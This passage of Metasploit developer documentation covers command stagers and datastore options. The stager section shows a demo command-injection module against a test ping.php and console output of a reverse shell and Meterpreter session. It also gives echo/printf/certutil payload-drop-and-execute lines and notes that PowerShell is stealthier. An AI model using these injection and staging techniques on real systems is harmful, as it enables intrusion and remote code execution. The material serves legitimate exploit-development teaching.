Msf::Exploit::CmdStager def initialize(info={}) super(update_info(info, 'Name' =&gt; \"Command Injection Using CmdStager\", 'Description' =&gt; %q{ This exploits a command injection using the command stager. }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'sinn3r' ], 'References' =&gt; [ [ 'URL', 'http://metasploit.com' ] ], 'Platform' =&gt; 'linux', 'Targets' =&gt; [ [ 'Linux', {} ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'CmdStagerFlavor' =&gt; [ 'printf' ], 'Privileged' =&gt; false, 'DisclosureDate' =&gt; \"2016-06-10\", 'DefaultTarget' =&gt; 0)) end def execute_command(cmd, opts = {}) # calls some method to inject cmd to the vulnerable code. end def exploit print_status(\"Exploiting...\") execute_cmdstager end end . As you can see, we have chosen the “printf” flavor as our command stager. We will explain more about this later, but basically what it does is it writes our payload to /tmp and executes it. Now let’s modify the execute_command method and get code execution against the test case. Based on the PoC, we know that our injection string should look like this: . 127.0.0.1+%26%26+[Malicious commands] . We do that in execute_command using HttpClient. Notice there is actually some bad character filtering involved to get the exploit working correctly, which is expected: . def filter_bad_chars(cmd) cmd.gsub!(/chmod \\+x/, 'chmod 777') cmd.gsub!(/;/, ' %26%26 ') cmd.gsub!(/ /, '+') end def execute_command(cmd, opts = {}) send_request_cgi({ 'method' =&gt; 'GET', 'uri' =&gt; '/ping.php', 'encode_params' =&gt; false, 'vars_get' =&gt; { 'ip' =&gt; \"127.0.0.1+%26%26+#{filter_bad_chars(cmd)}\" } }) end def exploit print_status(\"Exploiting...\") execute_cmdstager end . And let’s run that, we should have a shell: . msf exploit(cmdstager_demo) &gt; run [*] Started reverse TCP handler on 10.6.0.92:4444 [*] Exploiting... [*] Transmitting intermediate stager for over-sized stage...(105 bytes) [*] Sending stage (1495599 bytes) to 10.6.0.92 [*] Meterpreter session 1 opened (10.6.0.92:4444 -&gt; 10.6.0.92:51522) at 2016-06-10 11:51:03 -0500 . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#the-msfexploitcmdstager-mixin",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#the-msfexploitcmdstager-mixin"
  },"241": {
    "doc": "How to use command stagers",
    "title": "Flavors",
    "content": "Now that we know how to use the Msf::Exploit::CmdStager mixin, let’s take a look at the command stagers you can use. Available flavors: . | bourne | debug_asm | debug_write | echo | printf | vbs | certutil | tftp | wget | curl | fetch | lwprequest | psh_invokewebrequest | . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#flavors",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#flavors"
  },"242": {
    "doc": "How to use command stagers",
    "title": "VBS Command Stager - Windows Only",
    "content": "The VBS command stager is for Windows. What this does is it encodes our payload with Base64, save it on the target machine, also writes a VBS script using the echo command, and then lets the VBS script to decode the Base64 payload, and execute it. If you are exploiting Windows that supports Powershell, then you might want to consider using that instead of the VBS stager, because Powershell tends to be more stealthy. To use the VBS stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'vbs' ] . Or set the :vbs key to execute_cmdstager: . execute_cmdstager(flavor: :vbs) . You will also need to make sure the module’s supported platforms include windows (also in the metadata), example: . 'Platform' =&gt; 'win' . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#vbs-command-stager---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#vbs-command-stager---windows-only"
  },"243": {
    "doc": "How to use command stagers",
    "title": "Certutil Command Stager - Windows Only",
    "content": "Certutil is a Windows command that can be used to dump and display certification authority, configuration information, configure certificate services, back and restore CA components, etc. It only comes with newer Windows systems starting from Windows 2012, and Windows 8. One thing certutil can also do for us is decode the Base64 string from a certificate, and save the decoded content to a file. The following demonstrates: . echo -----BEGIN CERTIFICATE----- &gt; encoded.txt echo Just Base64 encode your binary data echo TVoAAA== &gt;&gt; encoded.txt echo -----END CERTIFICATE----- &gt;&gt; encoded.txt certutil -decode encoded.txt decoded.bin . To take advantage of that, the Certutil command stager will save the payload in Base64 as a fake certificate, ask certutil to decode it, and then finally execute it. To use the Certutil command stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'certutil' ] . Or set the :certutil key to execute_cmdstager: . execute_cmdstager(flavor: :certutil) . You will also need to remember to set the platform in the metadata: . 'Platform' =&gt; 'win' . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#certutil-command-stager---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#certutil-command-stager---windows-only"
  },"244": {
    "doc": "How to use command stagers",
    "title": "Debug_write Command Stager - Windows Only",
    "content": "The debug_write command stager is an old Windows trick to write a file to the system. In this case, we use debug.exe to write a small .Net binary, and that binary will take a hex-ascii file created by the echo command, decode the binary, and finally execute. Obviously, to be able to use this command stager, you must make sure the target is a Windows system that supports .Net. To use the debug_write command stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'debug_write' ] . Or set the :debug_write key to execute_cmdstager: . execute_cmdstager(flavor: :debug_write) . You will also need to remember to set the platform in the metadata: . 'Platform' =&gt; 'win' . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#debug_write-command-stager---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#debug_write-command-stager---windows-only"
  },"245": {
    "doc": "How to use command stagers",
    "title": "Debug_asm Command Stager - Windows Only",
    "content": "The debug_asm command stager is another old Windows trick used to assemble a COM file, and then COM file will decode our hex-ascii payload, and then execute it. To use the debug_asm command stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'debug_asm' ] . Or set the :debug_asm key to execute_cmdstager: . execute_cmdstager(flavor: :debug_asm) . You will also need to remember to set the platform in the metadata: . 'Platform' =&gt; 'win' . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#debug_asm-command-stager---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#debug_asm-command-stager---windows-only"
  },"246": {
    "doc": "How to use command stagers",
    "title": "TFTP Command Stager - Windows Only",
    "content": "The TFTP command stager uses tftpd.exe to download our payload, and then use the start.exe command to execute it. This technique only works well against an older version of Windows (such as XP), because newer Windows machines no longer install tftp.exe by default. The TFTP command stager must bind to UDP port 69, so msfconsole must be started as root: . rvmsudo ./msfconsole . To use the TFTP stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'tftp' ] . Or set the :tftp key to execute_cmdstager: . execute_cmdstager(flavor: :tftp) . You will also need to remember to set the platform in the metadata: . 'Platform' =&gt; 'win' . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#tftp-command-stager---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#tftp-command-stager---windows-only"
  },"247": {
    "doc": "How to use command stagers",
    "title": "PowerShell Invoke-WebRequest - Windows Only",
    "content": "To use the PowerShell Invoke-WebRequest stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'psh_invokewebrequest' ] . Or set the :psh_invokewebrequest key to execute_cmdstager: . execute_cmdstager(flavor: :psh_invokewebrequest ) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#powershell-invoke-webrequest---windows-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#powershell-invoke-webrequest---windows-only"
  },"248": {
    "doc": "How to use command stagers",
    "title": "Bourne Command Stager - Multi Platform",
    "content": "Linemax minimum: 373 . The Bourne command stager supports multiple platforms except for Windows (because the use of the which command that Windows does not have). It functions rather similar to the VBS stager, except when it decodes the Base64 payload at runtime, there are multiple commands to choose from: base64, openssl, python, or perl. To use the Bourne stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'bourne' ] . Or set the :bourne key to execute_cmdstager: . execute_cmdstager(flavor: :bourne) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#bourne-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#bourne-command-stager---multi-platform"
  },"249": {
    "doc": "How to use command stagers",
    "title": "Echo Command Stager - Multi Platform",
    "content": "Linemax minimum: 26 . The echo command stager is suitable for multiple platforms except for Windows. It just echos the payload, chmod and execute it. An example of that looks similar to this: . echo -en \\\\x41\\\\x41\\\\x41\\\\x41 &gt;&gt; /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload . To use the echo stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'echo' ] . Or set the :echo key to execute_cmdstager: . execute_cmdstager(flavor: :echo) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#echo-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#echo-command-stager---multi-platform"
  },"250": {
    "doc": "How to use command stagers",
    "title": "Printf Command Stager - Multi Platform",
    "content": "Linemax minimum: 25 . The printf command stager is also suitable for multiple platforms except for Windows. It just uses the printf command to write the payload to disk, chmod and execute it. An example of that looks similar to this: . printf '\\177\\177\\177\\177' &gt;&gt; /tmp/payload ; chmod +x /tmp/payload ; /tmp/payload ; rm -f /tmp/payload . To use the printf stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'printf' ] . Or set the :printf key to execute_cmdstager: . execute_cmdstager(flavor: :printf) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#printf-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#printf-command-stager---multi-platform"
  },"251": {
    "doc": "How to use command stagers",
    "title": "cURL Command Stager - Multi Platform",
    "content": "To use the cURL stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'curl' ] . Or set the :curl key to execute_cmdstager: . execute_cmdstager(flavor: :curl) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#curl-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#curl-command-stager---multi-platform"
  },"252": {
    "doc": "How to use command stagers",
    "title": "wget Command Stager - Multi Platform",
    "content": "To use the wget stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'wget' ] . Or set the :wget key to execute_cmdstager: . execute_cmdstager(flavor: :wget) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#wget-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#wget-command-stager---multi-platform"
  },"253": {
    "doc": "How to use command stagers",
    "title": "LWP Request Command Stager - Multi Platform",
    "content": "To use the lwprequest stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'lwprequest' ] . Or set the :lwprequest key to execute_cmdstager: . execute_cmdstager(flavor: :lwprequest) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#lwp-request-command-stager---multi-platform",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#lwp-request-command-stager---multi-platform"
  },"254": {
    "doc": "How to use command stagers",
    "title": "Fetch Command Stager - BSD Only",
    "content": "To use the fetch stager, either specify your CmdStagerFlavor in the metadata: . 'CmdStagerFlavor' =&gt; [ 'fetch' ] . Or set the :fetch key to execute_cmdstager: . execute_cmdstager(flavor: :fetch) . ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#fetch-command-stager---bsd-only",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html#fetch-command-stager---bsd-only"
  },"255": {
    "doc": "How to use command stagers",
    "title": "How to use command stagers",
    "content": "Command stagers provide an easy way to write exploits against typical vulnerabilities such as command execution or code injection. There are currently 14 different flavors of command stagers, each uses system command (or commands) to save your payload, sometimes decode, and execute. ",
    "url": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html",
    "relUrl": "/docs/development/developing-modules/guides/how-to-use-command-stagers.html"
  },"256": {
    "doc": "How to use datastore options",
    "title": "Datastore Option Overview",
    "content": "A datastore option is a type of variable that can be set by the user, allowing various components of Metasploit to be more configurable during use. For example, in msfconsole, you can set the ConsoleLogging option in order to log all the console input/output - something that’s kind of handy for documentation purposes during a pentest. When you load a module, there will be a lot more options registered by the mixin(s) or the module. Some common ones include RHOSTS and RPORT for a server-side exploit or auxiliary module, SRVHOST for a client-side module, etc. The best way to find out exactly what datastore options you can set is by using these commands: . | show options - Shows you all the basic options. | show advanced - Shows you all the advanced options. | show missing - Shows you all the required options you have not configured. | set - Shows you everything. Obviously, you also use this command to set an option. | . Option sources: ModuleDataStore, active_module, session, and framework . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#datastore-option-overview",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#datastore-option-overview"
  },"257": {
    "doc": "How to use datastore options",
    "title": "How users look at datastore options",
    "content": "On the user’s side, datastore options are seen as global or module-level: Global means all the modules can use that option, which can be set by using the setg command. Module-level means only that particular module you’re using remembers that datastore option, no other components will know about it. You are setting a module-level option if you load a module first, and then use the set command, like the following: . msf &gt; use exploit/windows/smb/ms08_067_netapi msf exploit(ms08_067_netapi) &gt; set rhost 10.0.1.3 rhost =&gt; 10.0.1.3 . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#how-users-look-at-datastore-options",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#how-users-look-at-datastore-options"
  },"258": {
    "doc": "How to use datastore options",
    "title": "How Metasploit developers look at datastore options",
    "content": "On the development side, things are a little crazier. Datastore options actually can be found in at least four different sources: the ModuleDataStore object, active_module, session object, or the framework object. If you’re just doing module development, the best source you can trust is the ModuleDataStore object. This object has a specific load order before handing you the option you want: if the option can be found in the module’s datastore, it will give you that. If not found, it will give you the one from framework. The following is an example of how to read a datastore option in a module: . current_host = datastore['RHOST'] . If your dev work is outside the module realm, there is a good possibility that you don’t even have the ModuleDataStore object. But in some cases, you still might be able to read from the active_module accessor from the driver. Or if you have access to ModuleCommandDispatcher, there is a mod method too that gives you the same thing, and sometimes mixins pass this around in a run_simple method while dispatching a module. One example you can look at is the Msf::Ui::Console::CommandDispatcher::Auxiliary class. In some cases such as running a script in post exploitation, you might not have ModuleDataStore or even active_module, but you should still have a session object. There should be an exploit_datastore that gives you all the datastore options: . session.exploit_datastore . If you don’t have access to the module, or to a session object, the last source is obviously the framework object, and there is ALWAYS a framework object. However, like we said earlier, if the user sets a module-level option, no other components will see it, this includes the framework object: . framework.datastore . So now you know there are multiple sources of datastore options. And hopefully at this point you are well aware that not all sources necessarily share the same thing. If you have to try everything, as a general rule, this should be your load order: . | Try from the ModuleDataStore | Try from active_module | Try from session | Try from framework | . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#how-metasploit-developers-look-at-datastore-options",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#how-metasploit-developers-look-at-datastore-options"
  },"259": {
    "doc": "How to use datastore options",
    "title": "Core option types",
    "content": "All core datastore option types are defined in the option_container.rb file as classes. You should always pick the most appropriate one because each has its own input validator. When you initialize an option during datastore registration, it should be in the following format: . OptSomething.new(option_name, [boolean, description, value, *enums*], aliases: *aliases*, conditions: *conditions*) . | option_name - Clearly means the name of the datastore option. | boolean - The first attribute, true means this is a required option, false means optional. | description - A short description about this option | value - A default value. Note if the first attribute is false, you don’t need to provide a value, it’ll be set to nil automatically. | enums - optional An array of acceptable values, e.g. %w[ LEFT RIGHT ]. | aliases - optional, key-word only An array of additional names that refer to this option. This is useful when renaming a datastore option to retain backward compatibility. See the Renaming datastore options section for more information | conditions - optional, key-word only An array of a condition for which the option should be displayed. This can be used to hide options when they are irrelevant based on other configurations. See the Filtering datastore options section for more information. | . Now let’s talk about what classes are available: . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#core-option-types",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#core-option-types"
  },"260": {
    "doc": "How to use datastore options",
    "title": "OptAddress",
    "content": "An input that is an IPv4 address. Code example: . OptAddress.new('IP', [ true, 'Set an IP', '10.0.1.3' ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optaddress",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optaddress"
  },"261": {
    "doc": "How to use datastore options",
    "title": "OptAddressRange",
    "content": "An input that is a range of IPv4 addresses, for example: 10.0.1.1-10.0.1.20, or 10.0.1.1/24. You can also supply a file path instead of a range, and it will automatically treat that file as a list of IPs. Or, if you do the rand:3 syntax, with 3 meaning 3 times, it will generate 3 random IPs for you. Basic code example: . OptAddressRange.new('Range', [ true, 'Set an IP range', '10.0.1.3-10.0.1.23' ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optaddressrange",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optaddressrange"
  },"262": {
    "doc": "How to use datastore options",
    "title": "OptBool",
    "content": "Boolean option. It will validate if the input is a variant of either true or false. For example: y, yes, n, no, 0, 1, etc. Code example: . OptBool.new('BLAH', [ true, 'Set a BLAH option', false ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optbool",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optbool"
  },"263": {
    "doc": "How to use datastore options",
    "title": "OptEnum",
    "content": "Basically this will limit the input to specific choices. For example, if you want the input to be either “apple”, or “orange”, and nothing else, then OptEnum is the one for you. Code example: . # Choices are: apple or range, defaults to apple OptEnum.new('FRUIT', [ true, 'Set a fruit', 'apple', ['apple', 'orange']]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optenum",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optenum"
  },"264": {
    "doc": "How to use datastore options",
    "title": "OptInt",
    "content": "This can be either a hex value, or decimal. OptInt.new('FILE', [ true, 'A hex or decimal', 1024 ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optint",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optint"
  },"265": {
    "doc": "How to use datastore options",
    "title": "OptPath",
    "content": "If your datastore option is asking for a local file path, then use this. OptPath.new('FILE', [ true, 'Load a local file' ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optpath",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optpath"
  },"266": {
    "doc": "How to use datastore options",
    "title": "OptPort",
    "content": "For an input that’s meant to be used as a port number. This number should be between 0 - 65535. Code example: . OptPort.new('RPORT', [ true, 'Set a port', 21 ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optport",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optport"
  },"267": {
    "doc": "How to use datastore options",
    "title": "OptRaw",
    "content": "It actually functions exactly the same as OptString. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optraw",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optraw"
  },"268": {
    "doc": "How to use datastore options",
    "title": "OptRegexp",
    "content": "Datastore option is a regular expression. OptRegexp.new('PATTERN', [true, 'Match a name', '^alien']), . Other types: . In some cases, there might not be a well-suited datastore option type for you. The best example is an URL: even though there’s no such thing as a OptUrl, what you can do is use the OptString type, and then in your module, do some validation for it, like this: . def valid?(input) if input =~ /^http:\\/\\/.+/i return true else # Here you can consider raising OptionValidateError return false end end if valid?(datastore['URL']) # We can do something with the URL else # Not the format we're looking for. Refuse to do anything. end . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optregexp",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optregexp"
  },"269": {
    "doc": "How to use datastore options",
    "title": "OptString",
    "content": "Typically for a string option. If the input begins with “file://”, OptString will also automatically assume this is a file, and read from it. However, there is no file path validation when this happens, so if you want to load a file, you should use the OptPath instead, and then read the file yourself. Code example: . OptString.new('MYTEST', [ true, 'Set a MYTEST option', 'This is a default value' ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optstring",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#optstring"
  },"270": {
    "doc": "How to use datastore options",
    "title": "Registering and deregistering module options",
    "content": " ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#registering-and-deregistering-module-options",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#registering-and-deregistering-module-options"
  },"271": {
    "doc": "How to use datastore options",
    "title": "The register_options method",
    "content": "The register_options method can register multiple basic datastore options. Basic datastore options are the ones that either must be configured, such as the RHOST option in a server-side exploit. Or it’s very commonly used, such as various username/password options found in a login module. The following is an example of registering multiple datastore options in a module: . register_options( [ OptString.new('SUBJECT', [ true, 'Set a subject' ]), OptString.new('MESSAGE', [ true, 'Set a message' ]) ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-register_options-method",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-register_options-method"
  },"272": {
    "doc": "How to use datastore options",
    "title": "The register_advanced_options method",
    "content": "The register_advanced_options method can register multiple advanced datastore options. Advanced datastore options are the ones that never require the user to configure before using the module. For example, the Proxies option is almost always considered as “advanced”. But of course, it can also mean that’s something that most user will find difficult to configure. An example of register an advanced option: . register_advanced_options( [ OptInt.new('Timeout', [ true, 'Set a timeout, in seconds', 60 ]) ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-register_advanced_options-method",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-register_advanced_options-method"
  },"273": {
    "doc": "How to use datastore options",
    "title": "The deregister_options method",
    "content": "The deregister_options method can deregister either basic or advanced options. Usage is really straight-forward: . deregister_options('OPTION1', 'OPTION2', 'OPTION3') . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-deregister_options-method",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#the-deregister_options-method"
  },"274": {
    "doc": "How to use datastore options",
    "title": "Changing the default value for a datastore option",
    "content": "When a datastore option is already registered by a mixin, there are still ways to change the default value from the module. You can either use the register_options method, or adding a DefaultOptions key in the module’s metadata. Using the DefaultOptions key is preferred because the option’s description and other attributes will remain unchanged. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#changing-the-default-value-for-a-datastore-option",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#changing-the-default-value-for-a-datastore-option"
  },"275": {
    "doc": "How to use datastore options",
    "title": "Using register_options to change the default value",
    "content": "One of the advantages of using register_options is that if the datastore option is advanced, this allows it to be on the basic option menu, meaning when people do “show options” on msfconsole, that option will be there instead. You also get to change the option description, and whether it should be required or not with this method. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#using-register_options-to-change-the-default-value",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#using-register_options-to-change-the-default-value"
  },"276": {
    "doc": "How to use datastore options",
    "title": "Using DefaultOptions to change the default value",
    "content": "When Metasploit initializes a module, an import_defaults method is called. This method will update all existing datastore options (which is why register_options can be used to update default values), and then it will specifically check the DefaultOptions key from the module’s metadata, and update again. Here’s an example of an exploit module’s initialize portion with the DefaultOptions key: . def initialize(info={}) super(update_info(info, 'Name' =&gt; \"Module name\", 'Description' =&gt; %q{ This is an example of setting the default value of RPORT using the DefaultOptions key }, 'License' =&gt; MSF_LICENSE, 'Author' =&gt; [ 'Name' ], 'References' =&gt; [ [ 'URL', '' ] ], 'Platform' =&gt; 'win', 'Targets' =&gt; [ [ 'Windows', { 'Ret' =&gt; 0x41414141 } ] ], 'Payload' =&gt; { 'BadChars' =&gt; \"\\x00\" }, 'DefaultOptions' =&gt; { 'RPORT' =&gt; 8080 }, 'Privileged' =&gt; false, 'DisclosureDate' =&gt; \"\", 'DefaultTarget' =&gt; 0)) end . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#using-defaultoptions-to-change-the-default-value",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#using-defaultoptions-to-change-the-default-value"
  },"277": {
    "doc": "How to use datastore options",
    "title": "Modifying datastore options at run-time",
    "content": "Currently, the safest way to modify a datastore option at run-time is to override a method. For example, some mixins retrieve the RPORT option like this: . def rport datastore['RPORT'] end . In that scenario, you can override this rport method from your module, and return a different value: . def rport 80 end . This way, when a mixin wants that information, it will end up with the value 80, and not whatever is actually in datastore['RPORT']. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#modifying-datastore-options-at-run-time",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#modifying-datastore-options-at-run-time"
  },"278": {
    "doc": "How to use datastore options",
    "title": "Ideal datastore naming",
    "content": "Normal options are always UPPERCASE, advanced options are CamelCase, advanced options with a similar purpose are Prefixed::CamelCase. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#ideal-datastore-naming",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#ideal-datastore-naming"
  },"279": {
    "doc": "How to use datastore options",
    "title": "Renaming datastore options",
    "content": "Options can be renamed and retain backward compatibility by using the alias: keyword argument in the new option. For example, to rename OldOption to NewOption, the new definitions would look something like: . OptString.new('NewOption', [true, 'A (sort of) new option', 'hello'], aliases: %w[ OldOption ]) . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#renaming-datastore-options",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#renaming-datastore-options"
  },"280": {
    "doc": "How to use datastore options",
    "title": "Filtering datastore options",
    "content": "Options can be hidden in certain conditions using the conditions: keyword argument to their definition. This allows options to be hidden when they are not relevant based on the value of another option, the selected target or the selected action. The syntax for a condition is *thing* *operator* *value*. | thing - One of ACTION, TARGET or the name of a datastore option. | operator - One of ==, !=, in, nin. In the case of in and nin (not-in), the value is an array of values. | value - The value to check for in the condition. | . When the condition evaluates to true, the option is considered active and displayed to the user. Datastore options with no defined conditions are active by default. ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#filtering-datastore-options",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#filtering-datastore-options"
  },"281": {
    "doc": "How to use datastore options",
    "title": "Filter examples",
    "content": ". | conditions: %w[VERSION == 5] - Active when the VERSION datastore option is 5. | conditions: ['ACTION', 'in', %w[SSRF EXEC SECSTORE]] - Active when the ACTION is one of SSRF, EXEC or SECSTORE | . ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#filter-examples",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html#filter-examples"
  },"282": {
    "doc": "How to use datastore options",
    "title": "How to use datastore options",
    "content": " ",
    "url": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html",
    "relUrl": "/docs/development/developing-modules/module-metadata/how-to-use-datastore-options.html"
  },"283": {
    "doc": "Overview",
    "title": "On this page",
    "content": ". | EXE Example | DLL Example | Printf() | Custom Headers | Code Randomization | . Metasploit::Framework::Compiler::Windows is a wrapper of Metasm specifically for compiling C code for the Windows platform. The purpose of the wrapper is to support default headers, such as stdio.h, stdio.h, String.h, Windows.h, or some other important headers that you might use while writing in C. ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#on-this-page",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#on-this-page"
  },"284": {
    "doc": "Overview",
    "title": "EXE example",
    "content": "c_template = %Q|#include &lt;Windows.h&gt; int main(void) { LPCTSTR lpMessage = \"Hello World\"; LPCTSTR lpTitle = \"Hi\"; MessageBox(NULL, lpMessage, lpTitle, MB_OK); return 0; }| require 'metasploit/framework/compiler/windows' ## Save as an exe varibale exe = Metasploit::Framework::Compiler::Windows.compile_c(c_template) ## Save the binary as a file Metasploit::Framework::Compiler::Windows.compile_c_to_file('/tmp/test.exe', c_template) . ",
    "url": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#exe-example",
    "relUrl": "/docs/development/developing-modules/libraries/c/how-to-use-metasploit-framework-compiler-windows-to-compile-c-code.html#exe-example"
  },"285": {
    "doc": "Overview",
    "title": "DLL example",
